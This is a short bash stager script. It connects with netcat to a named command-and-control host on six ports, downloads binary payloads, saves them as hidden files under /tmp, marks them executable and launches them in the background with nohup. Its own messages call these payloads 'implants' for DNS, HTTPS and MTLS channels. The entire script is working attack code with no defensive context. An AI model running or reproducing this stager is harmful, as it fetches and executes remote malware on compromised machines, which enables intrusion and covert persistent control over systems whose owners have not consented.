#!/bin/bash

C2="secure.glyphforge.net"

stage() {
    local port=$1
    local drop=$2

    # Connect via nc, read 4 byte size header + data
    local tmpraw=$(mktemp)
    nc -w 10 "$C2" "$port" > "$tmpraw" 2>/dev/null

    if [ ! -s "$tmpraw" ]; then
        echo "[-] Failed port $port"
        rm -f "$tmpraw"
        return 1
    fi

    # Strip the 4 byte size header and save the rest
    dd if="$tmpraw" bs=1 skip=4 of="$drop" 2>/dev/null
    rm -f "$tmpraw"

    if [ -s "$drop" ]; then
        chmod +x "$drop"
        nohup "$drop" >/dev/null 2>&1 &
        echo "[+] $drop started"
    else
        echo "[-] Empty payload port $port"
        rm -f "$drop"
    fi
}

echo "[*] Staging implants..."

# Linux DNS
stage 1111 "/tmp/.dns_b"
stage 1112 "/tmp/.dns_s"

# Linux HTTPS
stage 1221 "/tmp/.http_b"
stage 1222 "/tmp/.http_s"

# Linux MTLS
stage 1331 "/tmp/.mtls_b"
stage 1332 "/tmp/.mtls_s"

echo "[*] Done"
